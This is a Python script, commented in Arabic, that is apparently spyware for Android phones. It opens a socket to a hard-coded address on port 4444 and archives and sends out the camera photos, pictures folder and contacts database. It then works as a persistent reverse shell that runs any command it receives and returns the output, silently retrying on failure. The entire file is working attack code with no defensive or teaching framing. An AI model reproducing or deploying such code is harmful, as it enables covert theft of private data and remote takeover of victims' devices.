import os
import socket
import subprocess

IP = '192.168.8.164'
PORT = 4444

def exfiltrate_data(s):
    # أوامر جمع وسحب الملفات وسجل المكالمات والبيانات
    paths = [
        "/sdcard/DCIM/Camera/",
        "/sdcard/Pictures/",
        "/data/data/com.android.providers.contacts/databases/contacts2.db"
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                # إرسال البيانات أو ضغطها وسحبها عبر الاتصال
                cmd = f"tar -czf - {path}"
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                s.sendall(p.stdout.read())
            except Exception as e:
                pass

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, PORT))
            exfiltrate_data(s)
            while True:
                data = s.recv(4096)
                if not data:
                    break
                p = subprocess.Popen(data.decode('utf-8', errors='ignore'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.sendall(p.stdout.read() + p.stderr.read())
            s.close()
        except:
            pass

if __name__ == '__main__':
    connect()
